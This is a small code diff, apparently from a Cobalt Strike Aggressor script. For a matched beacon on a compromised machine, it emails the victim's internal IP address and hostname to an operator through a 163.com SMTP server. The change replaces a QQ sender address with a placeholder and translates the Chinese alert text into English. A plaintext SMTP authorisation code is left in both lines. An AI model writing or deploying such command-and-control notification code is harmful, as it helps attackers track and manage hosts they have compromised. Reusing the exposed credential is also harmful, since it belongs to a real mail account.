@@ -6,7 +6,7 @@ foreach $entry (beacons()) {
     			   if($entry['id'] == $1){
 @account = @("xxx@163.com","xxx@163.com");
 $value = [new Main];
-[$value setValue : "1224856175@qq.com","qyeycemagybdijgc","smtp.163.com",@account,$entry['computer'],"fajianren",,"这家伙的ip:" . $entry['internal'] . " 家伙的host: " . $entry['computer']];
+[$value setValue : "xxxx@163.com","qyeycemagybdijgc","smtp.163.com",@account,$entry['computer'],"fajianren",,"Tagert ip:" . $entry['internal'] . "  Tagert host: " . $entry['computer']];
 [$value  start];
  
 }
